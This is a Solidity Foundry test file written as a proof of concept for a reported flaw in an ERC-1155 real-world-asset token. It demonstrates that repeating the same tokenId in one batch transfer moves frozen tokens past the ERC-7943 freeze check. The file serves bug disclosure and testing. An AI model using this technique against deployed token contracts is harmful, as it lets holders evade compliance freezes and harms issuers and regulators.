// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

import {Test} from "forge-std/Test.sol";
import {uRWA1155} from "../contracts/uRWA1155.sol";

/// @notice PoC for ethereum/ERCs#1814: duplicate tokenId in one
/// safeBatchTransferFrom bypasses the ERC-7943 frozen-balance check.
contract Dup1155PoC is Test {
    uRWA1155 token;
    address admin = address(0xA11CE);
    address holder = address(0xBEEF);
    address dest = address(0xD35);
    uint256 constant ID = 1;

    function setUp() public {
        vm.startPrank(admin);
        token = new uRWA1155("ipfs://x/{id}.json", admin); // admin receives all roles
        token.changeSendWhitelist(holder, true);
        token.changeReceiveWhitelist(holder, true);
        token.changeSendWhitelist(dest, true);
        token.changeReceiveWhitelist(dest, true);
        token.mint(holder, ID, 100);
        token.setFrozenTokens(holder, ID, 60); // balance 100, frozen 60, unfrozen 40
        vm.stopPrank();
    }

    function test_duplicateIdBatchBypassesFreeze() public {
        // The pre-flight oracle says moving 80 is NOT allowed (only 40 unfrozen).
        assertFalse(token.canTransfer(holder, dest, ID, 80));
        assertTrue(token.canTransfer(holder, dest, ID, 40));

        uint256[] memory ids = new uint256[](2);
        ids[0] = ID;
        ids[1] = ID;
        uint256[] memory values = new uint256[](2);
        values[0] = 40; // each element individually <= unfrozen 40
        values[1] = 40;

        vm.prank(holder);
        token.safeBatchTransferFrom(holder, dest, ids, values, "");

        // BUG: 80 moved although only 40 were unfrozen; 40 frozen tokens escaped.
        assertEq(token.balanceOf(dest, ID), 80);
        assertEq(token.balanceOf(holder, ID), 20);
        // Frozen accounting is now stale: 60 "frozen" against a 20 balance.
        assertEq(token.getFrozenTokens(holder, ID), 60);
    }
}
